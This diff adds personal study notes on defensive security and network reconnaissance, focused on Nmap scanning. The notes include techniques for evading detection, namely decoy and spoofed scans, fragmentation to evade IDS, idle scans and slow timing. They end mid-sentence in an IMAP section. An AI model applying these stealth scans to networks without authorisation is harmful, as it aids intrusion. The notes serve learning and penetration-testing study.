@@ -1,0 +1,2712 @@
+
+
+Introduction
+
+    Defensive Security
+        Preventing intrusions
+        Detecting intrusions
+
+    Security Operations Center
+        Main areas of interest
+            Vulnerabilities
+            Policy violations
+            Unauthorized activity
+            Network intrusions
+
+    Digital Forensics
+        File System         Analyzing a digital forensic image (low-level copy)
+        System memory       Forensic image too for malicious program in memory (not saved to disk)
+        System logs         Some traces will be left event if the attacker tries to clear their traces
+        Network logs        Logs of the network packets
+
+    Incident Response
+        Preparation
+        Detection and Analysis
+        Containment, Eradication, and Recovery
+        Post-Incident Activity
+
+    Malware Analysis
+        Static              Inspecting the malicious program without running it
+        Dynamic             Running the malware in a controlled environment and monitoring its activities
+
+    Rules of Engagement (ROE)
+        A document created at the initial stages of penetration testing engagement
+            Permission (legally protect individuals and organisations)
+            Test Scope (certain servers or applications)
+            Rules (define exactly the techniques that are permitted)
+
+    Penetration Testing Methodologies
+        General Theme
+            Information Gathering
+                Publically accessible information (OSINT and research, does not involve scanning)
+            Enumeration/Scanning
+                Discovering applications and services running on the systems
+            Exploitation
+                Leveraging vulnerabilities
+            Privilege Escalation
+                Once exploited (known as a foothold), expand your access to the system
+                    Horizontally (accessing another account of the same permission group)
+                    Vertically (another permission group)
+            Post-Exploitation
+                Other hosts (pivoting)
+                Other additional information (as a privileged user)
+                Covering tracks
+                Reporting
+
+    Primary scopes
+        Black-Box           No Knowledge (high-level process)
+        Grey-Box            Partial Knowledge (most popular, saves time)
+        White-Box           Full Knowledge (guarantees the entire attack surface)
+
+    Defence in Depth
+        CIA Triad
+            Confidentiality Integrity Availability
+        Principles of Privileges
+            Primary factors
+                The individual's role/function within the organisation
+                The sensitivity of the information being stored on the system
+            Key concepts
+                Privileged Identity Management (PIM)
+                Privileged Access Management (PAM)
+            Essential
+                The principle of least privilege
+        Security Models
+            The Bell-La Padula Model
+                Confidentiality
+                    Top Secret
+                    Secret
+                    Confidential
+            Biba Model
+                Integrity
+                    Layer 1
+                    Layer 2
+                    Layer 3
+
+    Threat Modelling
+        Process of reviewing, improving, and testing the security protocols
+            Similar to risk assessment
+                Preparation
+                Identification
+                Mitigations
+                Review
+            Frameworks
+                STRIDE
+                    Spoofing identity
+                    Tampering with data
+                    Repudiation threats
+                    Information disclosure
+                    Denial of service
+                    Elevation of privileges
+                PASTA
+                    Process for Attack Simulation and Threat Analysis
+
+    Incident Response
+        Computer Security Incident Response Team (CSIRT)
+            Preparation
+            Identification
+            Containment
+            Eradication
+            Recovery
+            Lessons
+
+
+
+Network Security
+
+    Passive Reconnaissance
+        These are all publicly available records and hence do not alert the target
+
+            whois
+                To query WHOIS servers (TCP port 43, request and response protocol)
+
+            nslookup <options> <domainName> <server>
+                Name Server Look Up
+                    To query DNS servers and find the IP of a domain name
+                Options
+                    A                   IPv4 Addresses
+                    AAAA                IPv6 Addresses
+                    CNAME               Canonical Name
+                    MX                  Mail Servers
+                    SOA                 Start of Authority
+                    TXT                 TXT Records
+                DNS Servers
+                    Cloudflare
+                        1.1.1.1
+                        1.0.0.1
+                    Google
+                        8.8.8.8
+                        8.8.4.4
+                    Quad9
+                        9.9.9.9
+                        149.112.112.112
+                Examples
+                    nslookup -type=A example.false 1.1.1.1
+                        We started from one domain and we could obtain several IPv4 addresses
+                            Each of these IP addresses can be further checked for insecurities
+                    nslookup -type=MX example.false
+                        Looking up the Mail Exchange servers
+                            Preceded by a number representing the order of priority
+
+            dig
+                To query DNS servers
+
+        Online services to collect information about a target without directly connecting to it
+
+            dnsdumpster.com
+                Mapping the domain
+                    There is a possibility that one subdomain has been set up and is not updated regularly
+                        Lack of proper regular updates usually leads to vulnerable services
+
+            shodan.io
+                Tries to connect every device reachable online to build a search engine of connected "things"
+
+        Summary
+
+            PURPOSE                                 CLI
+
+            Lookup WHOIS record                     whois example.false
+
+            Lookup DNS A records                    dig example.false A
+                                                    nslookup -type=A example.false
+
+            Lookup DNS MX records at DNS server     dig @1.1.1.1 example.false MX
+                                                    nslookup -type=MX example.false 1.1.1.1
+
+            Lookup DNS TXT records                  dig example.false TXT
+                                                    nslookup -type=TXT example.false
+
+
+    Active Reconnaissance
+
+        traceroute          To map the path to the target
+        ping                To check if the target system responds to ICMP Echo
+        telnet              To check which ports are open and reachable by attempting to connect to them
+
+        Any such connection might leave information in the logs showing
+            The client IP address
+            Time of connection
+            Duration of the connection
+            ...
+
+        However, not all connections are suspicious
+            It is possible to let your active reconnaissance appear as regular client activity (Browser)
+
+        Browser
+
+            Ports
+                It is possible to use custom ports to access a service
+                    For instance, https://127.0.0.1:8884/
+                        If there is an HTTPS server listening on that port, we will receive a web page
+
+            Developer Tools
+                View and modify the JavaScript
+                Inspect the cookies
+                Discover the folder structure
+                ...
+
+            Extensions (add-ons)
+                FoxyProxy
+                    Change the proxy server you are using to access the target website (Burp Suite)
+                User-Agent Switcher and Manager
+                    Pretend to access the webpage from a different OS or a different browser
+                Wappalyzer
+                    Provides insights about the technologies used on the websites
+
+        ping
+
+            Checking whether the remote system is online (if not blocked by a firewall)
+                Sends an ICMP Echo packet, and the remote system send back an ICMP Echo reply
+                    Internet Control Message Protocol echo/type 8
+                    Used to check network connectivity
+
+                        Linux           ping -c <integer> <ip>
+                        Windows         ping -n <integer> <ip>
+
+            Host Unreachable
+                The destination computer is possibly still booting or turned off, or the OS has crashed
+                It is unplugged from the network, or there is a faulty network device across the path
+                A firewall is blocking such packets on the system itself or a separate network appliance
+                    MS Windows firewall blocks ping by default
+                Your system is unplugged from the network
+
+        traceroute
+
+            Find the IP adresses of the routers or hops that a packet traverses from your system to a target host
+                Also reveals the number of routers between two systems
+                The route might change as many routers use dynamic routing protocols that adapt to network changes
+
+                    Linux
+                        traceroute <ip>
+                                On Unix-like OSs, traceroute send by default a sequence of UDP
+                                with destination port numbers ranging from 33434 to 33534
+
+                                Our system sends three packets with TTL set to 1, then three
+                                packets with TTL set to 2, and so forth: depending on the
+                                network topology we might get replies up from 3 routers
+                                    A star "*" indicate that our system didn't received an
+                                    expected ICMP time exceeded in-transit messages
+                                        If more than one IP by hop, it's the first
+
+                            -I  Option to use ICMP Echo packet
+                            -P  Arbitrary protocol such as UDP, TCP using SYN packets, or ICMP
+
+                                sudo traceroute -I example.false
+
+                    Windows
+                                Sends ICMP Echo Request packets
+                        tracert <ip>
+
+        telnet
+
+            Protocol for remote administration developed in 1969
+
+                Sends all the data in clear text
+                    Port 23
+
+                Can be used for other purposes
+                    Relies on TCP protocol
+                        Connect to any service running on TCP and grab its banner
+                        Even exchange a few messages unless it uses encryption
+
+                            telnet <ip> <port>
+                                Copy
+                                    From a vim file
+                                Paste
+                                        GET / HTTP/1.1
+                                        host: telnet
+                                    OR
+                                        GET /page.htm HTTP/1.1
+                                        host: telnet
+                                    AND
+                                        2 x ENTER
+
+        nc (netcat)
+
+            Supports both TCP and UDP protocols
+            It can function as a client that connects to a listenning port
+            It can act as a server that listens on a port of your choice
+
+                Connect
+
+                    nc -C <ip> <port>
+                        GET / HTTP/1.1
+                        host: netcat
+
+                            If Shift + Enter does not work
+                                    -C  Send CRLF as line‐ending
+                                Copy
+                                    From a vim file
+                                Paste
+                                    GET / HTTP/1.1
+                                    host: netcat
+
+                Listen
+
+                    nc <options> <port>
+
+                        -l      Listen mode
+                        -n      Numeric only (no resolution of hostnames via DNS, avoid warnings)
+                        -v      Verbose output
+                        -vv     Very verbose
+                        -k      Keep listening after client disconnects
+                        -p      Specify the port number (should appear just before the port number)
+
+                            nc -lnvp 1234
+
+
+    Nmap
+
+        1. Enumerate targets
+        2. Discover live hosts
+        3. Reverse-DNS lookup
+        4. Scan ports
+        5. Detect versions
+        6. Detect OS
+        7. Traceroute
+        8. Scripts
+        9. Write output
+
+
+        Nmap Live Host Discovery
+
+            Trying to port-scan offline systems will only waste time and create unnecessary noise on the network
+
+                Which systems are up?
+                What services are running on these systems?
+
+            Industry-standard tool for mapping networks, identifying live hosts, and discovering running services
+
+                1. ARP scan: ARP requests to discover live hosts
+                2. ICMP scan: ICMP requests to identify live hosts
+                3. TCP/UDP ping scan: Sends packets to TCP ports and UDP ports to determine live hosts
+
+                +  arp-scan and masscan, two scanners that overlap with part's of Nmap's host discovery
+
+            Nmap's Scriting Engine offers functionnalities from fingerprinting services to exploiting vulnerabilities
+
+
+            Subnetworks
+
+                Subnetwork refers to a logical connection
+
+                    In an IP network, a subnetwork is usually the equivalent of one or more network segments
+                        Connected together and configured to use the same router
+                            A subnet has its own IP address range
+
+                                If you are connected to the same subnet, you would expect your
+                                scanner to rely on ARP queries to discover live hosts
+                                    An ARP query aims to get the hardware address (MAC Address)
+
+                                If your are connected from a different subnet, the ARP queries
+                                won't be routed and hence cannot cross the subnet router
+                                    ARP packets are bound to their subnet (link-layer protocol)
+
+                Network segment refers to a physical connection
+
+                    A network segment is a group of computers connected using a shared medium
+                        The medium can be the Ethernet Switch or WiFi Access Point
+
+
+            Enumerating Targets
+
+                Generally speaking, you can provide a list, a range, or a subnet
+
+                    List: <ip> <url> <url>
+                    Range: 10.11.12.15-20
+                    Range: 10.10.0-255.101-125
+                    Subnet: <ip>/30
+
+                Providing a file as input for your list of targets
+
+                    nmap -iL list_of_hosts.txt
+
+                Checking the list of hosts that Nmap will scan, without scanning them
+
+                    Nmap will attempt a reverse-DNS resolution on all the targets to obtain their names
+                        Might reveal various information to the pentester
+
+                            nmap -sL <target(s)>
+
+                                    -n      If you don't want Nmap to the DNS server
+                                                Also return how many IP addresses will be scanned
+
+                                                    nmap -sL -n 10.10.0-255.101-125
+
+
+            Discovering Live Hosts
+
+                Starting from bottom to top
+
+                    Link Layer          ARP
+                    Network Layer       ICMP
+                    Transport Layer     TCP, UDP
+
+                Brief review
+
+                    ARP has one purpose
+                        Sending a frame to the broadcast address on the network segment
+                            Asking the computer with a specific IP address
+                            to respond providing its MAC (hardware) address
+
+                                If you want to ping a system on the same subnet
+                                    An ARP query should precede the ICMP Echo
+
+                    ICMP has many types
+                        ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply)
+
+                    TCP and UDP for network scanning purposes
+                        Specially-crafted packet to common TCP or UDP ports to check whether the target will respond
+                            Efficient, especially when ICMP Echo is blocked
+
+
+            Nmap Host Discovery Using ARP
+
+                A privileged user is root or a user who belongs to sudoers and can run sudo
+
+                    1. When privileged user tries to scan targets on a local network (Ethernet)
+
+                        Nmap uses ARP requests
+
+                    2. When privileged user tries to scan targets outside the local network
+
+                        Nmap uses ICMP Echo requests, TCP ACK to port 80, TCP SYN to port 443, ICMP Timestamp Request
+
+                    3. When unprivileged user tries to scan targets outside the local network
+
+                        Nmap resorts to a TCP 3-way handshake by sending SYN packets to port 80 and 443
+
+                By default, Nmap uses ping scan to find live hosts
+                    Then proceeds to scan live host only
+
+                Use Nmap to discover online hosts without port-scanning the live systems
+
+                    nmap -sn <target(s)>
+
+                Use Nmap only to perform an ARP scan whithout port-scanning
+
+                    nmap -PR -sn <target(s)>
+
+                arp-scan
+
+                    arp-scan -l
+                    arp-scan --localnet
+                        Send ARP queries to all valid IP addresses on your local networks
+
+                    sudo arp-scan -I eth0 -l
+                        When more than one interface, discovering the live hosts on one of them
+                            Send ARP queries for all valid IPs on the eth0 interface
+
+                Check the packets generated
+
+                    tcpdump
+                    Wireshark
+
+                To indicate it is a broadcast
+
+                    ARP Request from "computer1" to "computer1"
+
+
+            Nmap Host Discovery Using ICMP
+
+                We can ping every IP address on a network and see who would respond to
+                our ping (ICMP Type 8/Echo) requests with a ping reply (ICMP Type 0)
+
+                    It is not always reliable
+                        Many firewalls block ICMP Echo
+                        New versions of MS Windows host firewall block ICMP Echo by default
+
+                    Remember that ARP query will precede the ICMP request if your target is on the same subnet
+
+                To use ICMP Echo Request to discover live hosts
+
+                    nmap -PE <target(s)>
+
+                            Remember
+                                    -sn     If you don't want a port scan
+
+                        Output example
+
+                            Nmap scan report for ...
+                            Host is up ...
+                            MAC Address ... (only on the same subnet)
+
+                                Generally speaking, we don't expect to learn the MAC addresses
+                                of the targets unless they are on the same subnet as our system
+
+                                    On the same subnet, Nmap didn't need to send ICMP packets
+                                    as it is confirmed that these host are up based on ARP
+
+                Because ICMP Echo requests tend to be blocked, to tell if a system is online you might consider
+
+                    ICMP Timestamp requests (should be followed by an ICMP Timestamp reply)
+
+                        nmap -PP -sn <target(s)>
+
+                    ICMP Address Mask requests (ICMP Type 17, checks whether it gets a ICMP Type 18 reply)
+
+                        nmap -PM -sn <target(s)>
+
+
+            Nmap Host Discovery Using TCP and UDP
+
+                TCP SYN Ping
+
+                    Send a packet with the SYN (Synchronize) flag set to a TCP port, 80 by default
+                        And wait for a response
+
+                            An open port should reply with a SYN/ACK (Acknowledge)
+
+                            A closed port would result in an RST (Reset)
+
+                    nmap -PS -sn <target(s)>
+
+                        -PS followed by the port number, range, list, or a combination of them
+
+                            -PS21
+                            -PS21-25
+                            -PS80,443,8080
+
+                    Privileged users (root and sudoers) can send TCP SYN packets and
+                    don't need to complete the TCP 3-way handshake even if the port is open
+
+                TCP ACK Ping
+
+                    Send a packet with an ACK flag set
+
+                        You must be running Nmap as a privileged user to be able to accomplish this
+                            As an unprivileged user, Nmap will attempt a 3-way handshake
+
+                    nmap -PA -sn <target(s)>
+
+                        By default, port 80 is used
+
+                            -PA21
+                            -PA21-25
+                            -PA80,443,8080
+
+                        Any TCP packet with an ACK flag should get a TCP packet back with an RST flag set
+
+                            The target responds with the RST flag set because the TCP packet
+                            with the ACK flag is not part of any ongoing connection
+
+                                Used to detect if the target host is up
+                                    Nmap sends each packet twice
+
+                UDP Ping
+
+                    Contrary to TCP SYN Ping, sending a UDP packet to an open port is not expected to lead to any reply
+
+                        However, if we send a UDP packet to a closed UDP port, we expect
+                        to get an ICMP Destination Unreachable packet (ICMP Type 3, Code 3)
+
+                            This indicates that the target system is up and available
+
+                        nmap -PU -sn <target(s)>
+
+                Masscan
+
+                    On a side note, Masscan uses a similar approach to discover the available systems
+
+                    However, to scan quickly, Masscan is quite aggressive with the rate of packets it generates
+
+                        masscan <ip/mask> -p443
+                        masscan <ip/mask> -p80,443
+                        masscan <ip/mask> -p22-25
+                        masscan <ip/mask> --top-ports 100
+
+
+            Using Reverse-DNS Lookup
+
+                Nmap's default behaviour is to use reverse-DNS online hosts
+                    Because the hostnames can reveal a lot
+
+                        A reverse DNS lookup is a DNS query for the domain name
+                        associated with a given IP address, the opposite of the
+                        more commonly used forward DNS lookup
+
+                    -n                                      To skip this step
+                    -R                                      To query the DNS server even for offline hosts
+                    --dns-servers <serv1[,serv2[,...]]>       To use a specific DNS server
+
+
+        Nmap Basic Port Scans
+
+            TCP and UDP Ports
+
+                In the same sense that an IP address specifies a host on a network among many others,
+                a TCP port or UDP port is used to identify a network service running on that host
+
+                    A port is usually linked to a service using that specific port number
+                        Administrators might choose other port numbers if neccessary
+
+                Results
+
+                    Open port           Service listening                       Accessible
+
+
+                    Closed port         No service                              Accessible          Not blocked by a firewall
+
+                    Filtered            Cannot determine if open or closed      Not accessible      Usually due to a firewall
+
+                    Unfiltered          Cannot determine if open or closed      Accessible          Using an ACK scan -sA
+
+
+                    Open|Filtered       Cannot determine if open or fitered
+
+                    Closed|Filtered     Cannot decide if closed or filtered
+
+
+            TCP Flags
+
+                The TCP Header is the first 24 bytes of a TCP Segment
+
+                    Source Port                 16 bits (2 bytes)
+                    Destination port            16 bits (2 bytes)
+                    Sequence Number             32 bits (4 bytes)
+                    Acknowledgement Number      32 bits (4 bytes)
+                    ...
+
+                Setting a flag bit means setting its value to 1 (1 bit)
+
+                    URG     A TCP Segment with this flag is processed immediately, before any previously sent TCP segments
+                    ACK     Used to acknowledge the receipt of a TCP segment
+                    PSH     Asking TCP to pass the data to the application promptly
+                    RST     To reset the connection
+                                Another device, such as a firewall, might send it to tear a TCP connection
+                                Also when data is sent to a host and there is no service on the receiving end to answer
+                    SYN     To initiate a TCP 3-way handshake and synchronize sequence numbers
+                    FIN     The sender has no more data to send
+
+
+            TCP Connect Scan
+
+                    Standard TCP connection establishment
+                        The client sends a TCP packet with SYN flag set
+                        The server responds with SYN/ACK if the port is open
+                        The client completes the 3-way handshake by sending an ACK
+
+                If your are not a privileged user (root or sudoers)
+                    TCP Connect Scan is the only possible option to discover open TCP ports
+
+                We are interested in learning whether the TCP port is open, not establishing a TCP connection
+                    Hence the connection is torn as soon as its state is confirmed
+                        By sending a RST/ACK
+
+                nmap -sT <target(s)>
+
+                    By default, Nmap will attempt to connect to the 1000 most common ports
+
+                        -F      To enable fast mode and decrease scanned ports from 1000 to 100
+                        -r      In consecutive order instead of random order (for instance, when a target boots up)
+
+                    IF TCP port is open
+
+                        Client          Server
+
+                        SYN -->
+                                        <-- SYN, ACK
+                        ACK -->
+                        RST, ACK -->
+
+                    A closed TCP port responds with RST/ACK to indicate that it is not open
+
+
+            TCP SYN (Stealth) Scan
+
+                The default scan mode when running Nmap as a privileged user
+                    Running as root or using sudo
+                        Unprivileged users are limited to TCP Connect Scan
+
+                TCP SYN Scan does not need to complete the TCP 3-way handshake
+                    It tears down the connection once it receives a response
+                        This decreases the chances of the scan being logged
+
+                nmap -sS <target(s)>
+
+                    IF TCP port is open
+
+                        Client          Server
+
+                        SYN -->
+                                        <-- SYN, ACK
+                        RST -->
+
+
+            UDP Scan
+
+                Connectionless protocol, it does not require any handshake
+
+                    If UDP port is open, no response is expected
+
+                        nmap -sU <target(s)>
+
+                            Client          Server
+
+                            UDP Packet -->
+
+                    A closed UDP port leads to ICMP Destination Unreachable (Port Unreachable)
+
+                        nmap -sU <target(s)>
+
+                            Client          Server
+
+                            UDP Packet -->
+                                            <-- ICMP Type 3, Code 3
+
+
+            Fine-Tuning Scope and Performance
+
+                Specifying the ports
+
+                    -p-                         All 65535 ports
+                    -F                          Fast mode, 100 most common ports
+                    --top-ports <number>        Scan <number> most common ports
+                    -p22,80,443                 Port list
+                    -p1-1023                    Port range, inclusive
+
+                Scan timing
+
+                    -T<0-5>
+                        0       Paranoid
+                        1       Sneaky
+                        2       Polite
+                        3       Normal
+                        4       Aggressive
+                        5       Insane
+
+                    To avoid IDS alerts
+                        -T0 scans one port at a time and waits 5 minutes between sending each probe
+                        -T1 is often used during real engagements where stealth is more important
+
+                    Default
+                        -T3 if you don't specify any timing
+
+                    Practice targets and CTFs
+                        -T4
+
+                    Speed
+                        -T5 can affect the accuracy due to the increased likelihood of packet loss
+
+                Packet rate
+
+                    --min-rate <number>
+                    --max-rate <number>
+                    --max-rate=10
+                            Controls the sending of packets per second
+
+                Probe parallelization
+
+                    --min-parallelism <numprobes>
+                    --max-parallelism <numprobes>
+                    --max-parallelism=512
+
+
+        Nmap Advanced Port Scans
+
+            Null Scan
+
+                Does not set any flag, all six flag bits are set to zero
+                A TCP packet with no flag set will not trigger any response when it reaches an open port
+
+                    However, we expect the target server to respond with an RST packet if the port is closed
+                    Consequently, the lack of RST response indicates ports that are not closed: Open or Filtered
+
+                        nmap -sN <target(s)>
+
+                            If TCP port is open
+
+                                Client                  Server
+
+                                NULL (no flags set)-->
+
+                            If TCP port is closed
+
+                                Client                  Server
+
+                                NULL (no flags set)-->
+                                                        <-- RST, ACK
+
+
+            FIN Scan
+
+                Sends a TCP packet with the FIN flag set
+
+                    Similarly, no response will be sent if the TCP port is open
+                    Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic
+
+                        nmap -sF <target(s)>
+
+                            If TCP port is open
+
+                                Client      Server
+
+                                FIN -->
+
+                            If TCP port is closed
+
+                                Client      Server
+
+                                FIN -->
+                                            <-- RST, ACK
+
+                                    Some firewalls will silently drop the traffic without sending an RST
+
+
+            Xmas Scan
+
+                Sets the FIN, PSH and URG flags simultaneously (Christmas tree lights)
+
+                    nmap -sX <target(s)>
+
+                        If TCP port is open
+
+                            Client              Server
+
+                            FIN, PSH, URG -->
+
+                        If TCP port is closed
+
+                            Client              Server
+
+                            FIN, PSH, URG -->
+                                                <-- RST, ACK
+
+
+            Maimon Scan
+
+                FIN and ACK bits are set
+                    The target should send an RST packet as a response, regardless of whether the TCP port is open
+
+                        This scan won't work on most targets encountered in modern networks
+                            BSD-derived systems drop the packet (exposing open ports)
+
+                                nmap -sM <target(s)>
+
+                                    Client          Server
+
+                                    FIN/ACK -->
+                                                    <-- RST
+
+
+            ACK Scan
+
+                TCP packet with the ACK flag set
+                    The target would respond to the ACK with RST regardless of the state of the port
+
+                        Because TCP packet with ACK flag set should be sent only in response to a received packet
+
+                            nmap -sA <target(s)>
+
+                                Client      Server
+
+                                ACK -->
+                                            <-- RST
+
+                        Helpful if there is a firewall
+                            Based on which ACK packets resulted in responses, you
+                            will learn which ports were not blocked by the firewall
+
+
+            Window Scan
+
+                Almost the same as the ACK Scan, gets an RST packet in reply to our "uninvited" ACK packets
+                However, it examines the TCP Window field of the RST packets returned
+
+                    On specific systems, this can reveal that the port is open
+                    Similarly, against a system with no firewall it will not provide much information
+
+                        nmap -sW <target(s)>
+
+                            Client      Server
+
+                            ACK -->
+                                        <-- RST
+
+
+            Custom Scan
+
+                TCP flag combination beyond the built-in TCP scan types
+
+                    --scanflags RSTSYNFIN               If you want to set SYN, RST, FIN
+                    --scanflags URGACKPSHRSTSYNFIN      Sets all flags
+
+
+            Spoofing and Decoys
+
+                In some network setups
+                    Able to scan a target system using a spoofed IP address an even a spoofed MAC address
+                    Only beneficial in a situation where you can guarantee to capture the response
+
+                From some random network using a spoofed IP address
+                    Chances are you won't have any response routed to you
+                    The scan results could be unreliable, useless
+
+                nmap -S <spoofedIP> <target>
+
+                    Nmap will craft all the packets using the provided source IP address
+                    The attacker needs to monitor the network traffic to analyze the replies
+
+                        1. Attacker sends a packet with a spoofed source IP address to the target machine
+                        2. Target machine replies to the spoofed IP address as the destination
+                        3. Attacker captures the replies to figure out open ports
+
+                nmap -e <interface> -Pn -S <spoofedIP> <target>
+
+                    In general, you expect to
+                        Specify the network interface using -e
+                        Explicitly disable ping scan -Pn
+
+                --spoof-mac <MAC>
+
+                    When you are on the same subnet as the target machine
+
+                nmap -D <decoyIP1>,<decoyIP2>,<attackerIP>,<decoyIP3> <target>
+
+                    Spoofing only works in a minimal number of cases where certain conditions are met
+                    Therefore, the attacker might resort using decoys to make it more challenging to be pinpointed
+
+                        The concept is simple
+                            Make the scan appear to be coming from many IP addresses
+                            so that the attacker's IP address would be lost among them
+
+                        nmap -D RND,<decoyIP1>,RND,ME,RND:<number> <target>
+
+                            ME
+                                To represent your real IP address
+                            RND:<number>
+                                To generate <number> random addresses
+
+
+            Fragmented Packets
+
+                Firewall
+
+                    A piece of software or hardware that permits packets to pass through or blocks them
+                        A tradidional firewall inpects, at least, the IP header and the transport layer header
+                        A more sophisticated firewall would also try to examine the data carried by the transport layer
+
+                IDS
+
+                    Inspects network packets for certain behavior patterns or specific content signatures
+                        IP header, transport layer header and the data contents in the transport layer
+
+                Fragmented Packets
+
+                    How can you make it less likely for a traditional firewall/IDS to detect your Nmap activity?
+                        You might benefit from dividing the packet into smaller packets
+
+                            sudo nmap -sS -p80 -f <target(s)>
+
+                                -f      To fragment across multiple packets
+                                            The IP data will be divided into 8 bytes or less
+                                            IP uses the Identification and Fragement Offset to aid in the reassembly
+                                -ff
+                                -f -f
+                                        The fragmentation of the data will be multiples of 16
+                                            The 24 bytes of the TCP header will be 16 and then 8 bytes
+
+
+            Idle/Zombie Scan
+
+                Requires an idle system connected to the network
+                    Nmap will make each probe appear as if coming from the idle (zombie) host
+                    Then it will check for indicators whether the idle host received any response to the spoofed probe
+                        This is accomplished by checking the IP identification value in the IP header
+
+                nmap -sI <zombieIP> <target>
+
+                    1. Trigger the idle host to respond so that you can record the current IP ID on the idle host
+
+                        Attacker        Idle
+
+                        SYN/ACK -->
+                                        <-- RST packet containing its newly incremented IP ID
+
+                    2. Send a SYN packet to a TCP port on the target
+
+                        The packet should be spoofed to appear as if it was coming from the idle host IP address
+
+                            Port is closed
+
+                                Attacker                        Target      Idle
+
+                                SYN (source equals Idle) -->    RST -->
+
+                            Port is open
+
+                                Attacker                        Target      Idle
+
+                                SYN (source equals Idle) -->    SYN/ACK -->
+                                                                            <-- RST
+
+                    3. Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier
+
+                        In case of firewall, the idle host won't increase the IP ID
+
+                            Attacker        Idle
+
+                            SYN/ACK -->
+                                            <-- RST packet containing incremented IP ID
+
+                        Compare
+
+                            IP ID of the RST packet received in the first step
+                            IP ID of the RST packet received in the third step
+
+                                If the difference is 1
+                                    The port on the target machine was closed or filtered
+
+                                If the difference is 2
+                                    The port on the target was open
+
+                An idle host is indispensable for the accuracy of the scan
+                    If the "idle host" is busy
+                        All the returned IP IDs would be useless
+
+
+            Getting More Details
+
+                --reason        Provide more details regarding Nmap reasoning and conclusions
+
+                -v              Verbose output
+                -vv             Very verbose
+
+                -d              Debugging details
+                -dd             Even more details
+
+
+        Nmap Post Port Scans
+
+            Service Detection
+
+                nmap -sV <target(s)>
+
+                    Require root privileges, used to learn if there are any known vulnerablities
+
+                    Using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection
+                        Determine service and version information for open ports
+
+                            --version-intensity <level>     Between 0, the lightest, and 9, the most complete
+                            --version-light                 Has an intensity of 2
+                            --version-all                   Has an intensity of 9
+
+                    A service is guessed based on the port number
+                    Unlike the service column, the version column is not a guess
+
+
+            OS Detection
+
+                nmap -sS -O <target(s)>
+
+                    Detect the OS based on its behaviour and any telltale signs in its responses
+                        Many factors might affect its accuracy
+                            Nmap needs at least one open and one closed port on the target
+                            OS fingerprints might get distorted due to the rising use of virtualization
+
+
+            Nmap's Traceroute
+
+                nmap -sS --traceroute <target>
+
+                    Find the routers between you and the target
+
+                    Nmap's traceroute works slightly different than the traceroute command or tracert on MS Windows
+
+                        Standard traceroute starts with all the packet of low
+                        TTL and keeps increasing until it reaches the target
+
+                        Nmap's traceroute starts with a packet of high
+                        TTL and keeps decreasing it
+
+                    Many routers are configured not to send ICMP Time-to-Live exceeded
+                        Prevent us from discovering their IP addresses
+
+
+        Nmap Scripting Engine
+
+            NSE is a Lua interpreter
+
+            Nmap default installation can easily contain close to 600 scripts
+                Check the files at /usr/share/nmap/scripts
+
+                    You can choose to run the scripts in the default category
+                        nmap -sS -sC <target>
+                            --script=default or simply adding -sC
+
+                    You can install other user's scripts
+                        Downloading and using a script from the internet holds a certain level of risk
+
+                    You can also specify the script by name or pattern
+                        --script "<name>"
+                        --script "ftp*"
+
+                    If your not sure what a script does
+                        Open the script file with a text editor
+                            Some scripts are pretty intrusive
+                            Or might be for a specific server (waste your time with no benefit)
+
+                    A benign script
+                        sudo nmap -sS -n --script "http-date" <target>
+                            Would retrieve the http server date and time
+                            Also, it prints how much the date differs from local time
+
+                    Number of algorithms (for encryption, compression, etc.)
+                        sudo nmap -sS -sC <target>
+
+
+        Saving the Output
+
+            Normal
+                Similar to the output you get on the screen when scanning a target
+
+                    -oN <fileName>      N stands for normal
+
+            Grepable
+                It makes filtering the scan output for specific keywords or terms efficient
+
+                    -oG <fileName>      G stands for Global Regular Expression Printer
+
+                        grep <keyword> <file>       An example use of grep
+
+            XML
+                Would be most convenient to process the output in other programs
+
+                    -oX <fileName>
+
+            All three formats
+                Combine -oN ,-oG and -oX
+
+                    -oA <filename>
+
+
+    Protocols and Servers
+
+        1. Sniffing Attack
+        2. MITM Attack
+        3. Password Attack
+        ...
+
+        Telnet
+
+            A Telnet server uses the Telnet protocol to listen for incoming connections on port 23
+                Used to connect to a virtual terminal of another computer, not encrypted
+                Anyone capturing your traffic will be abble to discover your usernames and passwords
+
+            HTTP
+                telnet <target> 80
+                    GET /
+
+            FTP
+                telnet <target> <port>
+                    HELP
+
+                telnet <target> 21
+                    STAT        Can provide some added information
+                    SYST        Shows the System Type of the target
+                    PASV        Switches the mode to passive
+
+                                    Active      The data is sent over a separate channel
+                                                originating from the FTP server's port 20
+
+                                    Passive     The data is sent over a separate channel
+                                                originating from an FTP client's port
+                                                above port number 1023
+
+                    TYPE A      Switches the file transfer mode to ASCII
+                    TYPE I      Switches the file transfer mode to binary
+
+                                    We cannot transfer a file using a simple client such
+                                    as Telnet because FTP creates a separate connection
+                                    for file transfer
+
+                ftp <target>
+                    ls          List the files
+                    get <name>  Get a file
+                    quit        Goodbye.
+
+            SMTP (Simple Mail Transfer Protocol)
+
+                SMTP is used to communicate with an MTA server
+                SMTP server listens on port 25 by default
+                SMTP uses cleartext, commands are sent without encryption
+                    Telnet client to connect to an SMTP server and act as an MUA sending a message
+
+                        telnet <target> 25
+                            helo <hostname>
+                            mail from:<email>
+                            rcpt to:<email>
+                            data
+
+                        Quit Telnet '^]'
+                            Since ^X is Ctrl + X
+                            Try Ctrl + ] for ^]
+                                Telnet console
+                                    quit
+
+                Email delivery over the Internet requires the following components
+
+                    MUA (Mail User Agent)
+                        An email client
+                            The MUA connects to a MSA to sends its message
+
+                    MSA (Mail Submission Agent)
+                        Receives the message, checks for any errors before transferring it to the MTA
+
+                    MTA (Mail Transfer Agent)
+                        MSA and MTA are commonly hosted on the same server
+                        Will send the email message to the MTA of the recipient
+                            MTA can also function as a MSA
+                            A typical setup have the MTA server also functionning as a MDA
+
+                    MDA (Mail Delivery Agent)
+                        The recipient will collect its email from the MDA using their email client
+
+            POP3 (Post Office Protocol 3)
+
+                POP3 server default port is 110
+                Commands are sent in cleartext
+
+                    telnet <target> 110
+                        USER <name>
+                        PASS <password>
+                        STAT
+                        LIST
+                        RETR <number>
+
+                        QUIT
+
+                Based on the default settings, the mail client deletes the mail message after it downloads it
+                To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP
+
+            IMAP (Internet Message Access Protocol)
+
+                IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients)
+                    If you mark an email message as read when checking your email on your smartphone
